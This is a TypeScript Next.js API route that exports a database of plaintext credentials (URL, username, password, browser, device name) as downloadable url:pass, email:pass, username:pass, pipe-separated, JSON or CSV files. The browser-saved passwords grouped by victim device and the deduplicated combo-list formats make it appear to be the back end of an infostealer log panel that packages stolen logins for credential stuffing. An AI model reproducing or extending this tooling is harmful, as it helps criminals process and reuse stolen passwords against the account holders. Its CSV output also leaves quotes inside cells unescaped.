import { NextRequest, NextResponse } from "next/server"
import { executeQuery } from "@/lib/mysql"
import { validateRequest } from "@/lib/auth"

/**
 * GET /api/v1/credentials/export
 * Export credentials in various formats
 * Query params:
 *   - format: url_pass | email_pass | username_pass | full | json (default: url_pass)
 *   - device_id: Filter by specific device (optional)
 *   - domain: Filter by domain (optional)
 *   - unique: Only unique combinations (default: true)
 */
export async function GET(request: NextRequest) {
  // Validate authentication
  const user = await validateRequest(request)
  if (!user) {
    return NextResponse.json({ success: false, error: "Unauthorized" }, { status: 401 })
  }

  try {
    const { searchParams } = new URL(request.url)
    const format = searchParams.get("format") || "url_pass"
    const deviceId = searchParams.get("device_id") || ""
    const domain = searchParams.get("domain") || ""
    const unique = searchParams.get("unique") !== "false" // Default to true

    // Build query
    let query = `
      SELECT
        c.url,
        c.domain,
        c.username,
        c.password,
        c.browser,
        c.is_email,
        c.email_domain,
        d.device_name
      FROM credentials c
      JOIN devices d ON c.device_id = d.device_id
      WHERE 1=1
    `

    const params: any[] = []

    if (deviceId) {
      query += ` AND c.device_id = ?`
      params.push(deviceId)
    }

    if (domain) {
      query += ` AND c.domain = ?`
      params.push(domain)
    }

    // Filter out empty passwords
    query += ` AND c.password IS NOT NULL AND c.password != ''`

    query += ` ORDER BY c.domain, c.username`

    const credentials = (await executeQuery(query, params)) as any[]

    // Generate export based on format
    let exportContent: string
    let filename: string
    let contentType: string

    switch (format) {
      case "url_pass":
        exportContent = generateUrlPassFormat(credentials, unique)
        filename = `credentials-url-pass-${Date.now()}.txt`
        contentType = "text/plain"
        break

      case "email_pass":
        exportContent = generateEmailPassFormat(credentials, unique)
        filename = `credentials-email-pass-${Date.now()}.txt`
        contentType = "text/plain"
        break

      case "username_pass":
        exportContent = generateUsernamePassFormat(credentials, unique)
        filename = `credentials-username-pass-${Date.now()}.txt`
        contentType = "text/plain"
        break

      case "full":
        exportContent = generateFullFormat(credentials)
        filename = `credentials-full-${Date.now()}.txt`
        contentType = "text/plain"
        break

      case "json":
        exportContent = JSON.stringify(
          credentials.map((c) => ({
            url: c.url,
            domain: c.domain,
            username: c.username,
            password: c.password,
            browser: c.browser,
            device: c.device_name,
          })),
          null,
          2
        )
        filename = `credentials-${Date.now()}.json`
        contentType = "application/json"
        break

      case "csv":
        exportContent = generateCSVFormat(credentials)
        filename = `credentials-${Date.now()}.csv`
        contentType = "text/csv"
        break

      default:
        return NextResponse.json(
          { success: false, error: "Invalid format. Use: url_pass, email_pass, username_pass, full, json, or csv" },
          { status: 400 }
        )
    }

    // Return file as download
    return new NextResponse(exportContent, {
      status: 200,
      headers: {
        "Content-Type": contentType,
        "Content-Disposition": `attachment; filename="${filename}"`,
        "Content-Length": Buffer.byteLength(exportContent).toString(),
      },
    })
  } catch (error) {
    console.error("Error exporting credentials:", error)
    return NextResponse.json(
      {
        success: false,
        error: error instanceof Error ? error.message : "Failed to export credentials",
      },
      { status: 500 }
    )
  }
}

/**
 * Format: URL:Password
 * Example: https://example.com:MyPassword123
 */
function generateUrlPassFormat(credentials: any[], unique: boolean): string {
  const lines = credentials.map((c) => `${c.url}:${c.password}`)

  if (unique) {
    return Array.from(new Set(lines)).join("\n")
  }

  return lines.join("\n")
}

/**
 * Format: Email:Password (only for email usernames)
 * Example: john@example.com:MyPassword123
 */
function generateEmailPassFormat(credentials: any[], unique: boolean): string {
  const emailCreds = credentials.filter((c) => c.is_email === 1 || isEmail(c.username))
  const lines = emailCreds.map((c) => `${c.username}:${c.password}`)

  if (unique) {
    return Array.from(new Set(lines)).join("\n")
  }

  return lines.join("\n")
}

/**
 * Format: Username:Password
 * Example: john_doe:MyPassword123
 */
function generateUsernamePassFormat(credentials: any[], unique: boolean): string {
  const lines = credentials.map((c) => `${c.username}:${c.password}`)

  if (unique) {
    return Array.from(new Set(lines)).join("\n")
  }

  return lines.join("\n")
}

/**
 * Format: URL|Username|Password (Pipe-separated)
 * Example: https://example.com|john@example.com|MyPassword123
 */
function generateFullFormat(credentials: any[]): string {
  const lines = credentials.map((c) => `${c.url}|${c.username}|${c.password}`)
  return lines.join("\n")
}

/**
 * Format: CSV
 */
function generateCSVFormat(credentials: any[]): string {
  const headers = ["URL", "Domain", "Username", "Password", "Browser", "Device"]
  const rows = credentials.map((c) => [
    c.url,
    c.domain,
    c.username,
    c.password,
    c.browser,
    c.device_name,
  ])

  const csv = [
    headers.join(","),
    ...rows.map((row) => row.map((cell) => `"${cell}"`).join(",")),
  ].join("\n")

  return csv
}

/**
 * Helper: Check if string is email
 */
function isEmail(text: string): boolean {
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
  return emailRegex.test(text)
}
